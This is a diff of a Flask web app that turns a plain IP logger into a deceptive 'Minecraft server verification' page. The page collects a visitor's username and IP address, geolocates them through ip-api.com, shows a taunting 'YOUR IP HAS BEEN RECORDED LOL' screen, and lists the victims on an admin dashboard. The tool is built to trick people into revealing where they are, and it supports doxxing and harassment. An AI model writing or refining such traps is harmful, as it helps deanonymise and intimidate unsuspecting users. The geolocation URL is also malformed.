@@ -1,99 +1,125 @@
 from flask import Flask, request, render_template_string, session, redirect, url_for
 import datetime
 import os
+import requests
 
 app = Flask(__name__)
-app.secret_key = "aby2837aufwh228dewuey389" # Needed for login sessions
+app.secret_key = "change-this-for-security"
 
-# --- CONFIGURATION ---
-ADMIN_PASSWORD = "your-secret-password"  # CHANGE THIS!
+# --- CONFIG ---
+ADMIN_PASSWORD = "your-password"
 recorded_ips = []
 
 # --- HTML TEMPLATES ---
 
-HOME_HTML = """
+# Page 1: The "Verification" Trap
+VERIFY_HTML = """
 <!DOCTYPE html>
 <html>
-<head><title>CAUGHT</title><style>
-    body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; background: #000; color: red; font-family: 'Arial Black', sans-serif; overflow: hidden; }
-    h1 { font-size: 6vw; text-align: center; text-transform: uppercase; animation: blinker 0.8s linear infinite; }
-    @keyframes blinker { 50% { opacity: 0; } }
+<head><title>Server Verification</title><style>
+    body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .box { background: #333; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+    input { padding: 10px; width: 200px; border: none; border-radius: 4px; margin-bottom: 10px; }
+    button { padding: 10px 20px; background: #555; color: white; border: none; border-radius: 4px; cursor: pointer; }
+    button:hover { background: #777; }
+</style></head>
+<body>
+    <div class="box">
+        <h2>MC Server Access</h2>
+        <p>Enter your username to verify your IP</p>
+        <form method="POST">
+            <input type="text" name="mc_name" placeholder="Minecraft Username" required><br>
+            <button type="submit">Verify & Connect</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+# Page 2: The "Caught" Screen
+CAUGHT_HTML = """
+<!DOCTYPE html>
+<html>
+<head><style>
+    body { background: #000; color: red; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial Black'; text-align: center; }
+    h1 { font-size: 5vw; animation: blink 0.8s infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
 </style></head>
 <body><h1>YOUR IP HAS BEEN RECORDED LOL</h1></body>
 </html>
 """
 
-LOGIN_HTML = """
-<!DOCTYPE html>
-<html>
-<head><title>Login</title></head>
-<body style="font-family: sans-serif; text-align: center; padding-top: 100px;">
-    <h2>Enter Admin Password</h2>
-    <form method="POST">
-        <input type="password" name="password" required>
-        <button type="submit">Login</button>
-    </form>
-    {% if error %}<p style="color:red;">{{ error }}</p>{% endif %}
-</body>
-</html>
-"""
-
+# Dashboard remains the same but shows the MC Username
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
-<head><title>Admin Dashboard</title><style>
-    body { font-family: sans-serif; padding: 30px; background: #f4f4f4; }
-    table { width: 100%; border-collapse: collapse; background: white; margin-top: 20px; }
-    th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
+<head><title>Admin</title><style>
+    body { font-family: sans-serif; padding: 20px; }
+    table { width: 100%; border-collapse: collapse; }
+    th, td { padding: 10px; border: 1px solid #ddd; }
     th { background: #333; color: white; }
-    .btn-clear { background: red; color: white; padding: 10px 20px; border: none; cursor: pointer; border-radius: 5px; }
 </style></head>
 <body>
     <div style="display: flex; justify-content: space-between;">
-        <h1>Recorded IPs</h1>
-        <form action="/clear" method="POST">
-            <button class="btn-clear" onclick="return confirm('Clear everything?')">CLEAR ALL LOGS</button>
-        </form>
+        <h1>IP/Username Logs</h1>
+        <form action="/clear" method="POST"><button style="background:red; color:white;">CLEAR</button></form>
     </div>
     <table>
-        <tr><th>Timestamp</th><th>IP Address</th><th>User Agent</th></tr>
+        <tr><th>MC Username</th><th>IP</th><th>Location</th><th>Time</th></tr>
         {% for entry in logs %}
-        <tr><td>{{ entry.time }}</td><td><code>{{ entry.ip }}</code></td><td><small>{{ entry.ua }}</small></td></tr>
+        <tr><td><strong>{{ entry.name }}</strong></td><td><code>{{ entry.ip }}</code></td><td>{{ entry.loc }}</td><td>{{ entry.time }}</td></tr>
         {% endfor %}
     </table>
 </body>
 </html>
 """
 
+# --- HELPERS ---
+
+def get_location(ip):
+    try:
+        r = requests.get(f"http://ip-api.com{ip}", timeout=2)
+        data = r.json()
+        return f"{data.get('city')}, {data.get('country')}" if data.get('status') == 'success' else "Unknown"
+    except: return "Error"
+
 # --- ROUTES ---
 
-@app.route('/')
-def log_ip():
-    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent')
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    recorded_ips.append({"time": timestamp, "ip": ip_addr, "ua": user_agent})
-    return render_template_string(HOME_HTML)
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    if request.method == 'POST':
+        # Get username from the form
+        username = request.form.get('mc_name', 'Unknown')
+        
+        # Get IP and Location
+        ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+        timestamp = datetime.datetime.now().strftime("%I:%M %p")
+        location = get_location(ip_addr)
+
+        # Log it
+        recorded_ips.append({
+            "name": username,
+            "ip": ip_addr,
+            "loc": location,
+            "time": timestamp
+        })
+        
+        return render_template_string(CAUGHT_HTML)
+    
+    return render_template_string(VERIFY_HTML)
 
 @app.route('/dashboard', methods=['GET', 'POST'])
 def dashboard():
-    # Handle Login
     if request.method == 'POST':
         if request.form.get('password') == ADMIN_PASSWORD:
             session['logged_in'] = True
-            return redirect(url_for('dashboard'))
-        return render_template_string(LOGIN_HTML, error="Wrong Password!")
-
-    # Check if logged in
     if not session.get('logged_in'):
-        return render_template_string(LOGIN_HTML)
-
+        return """<form method="POST">Pass: <input type="password" name="password"><input type="submit"></form>"""
     return render_template_string(DASHBOARD_HTML, logs=recorded_ips[::-1])
 
 @app.route('/clear', methods=['POST'])
 def clear_logs():
-    if session.get('logged_in'):
-        recorded_ips.clear()
+    if session.get('logged_in'): recorded_ips.clear()
     return redirect(url_for('dashboard'))
 
 if __name__ == "__main__":
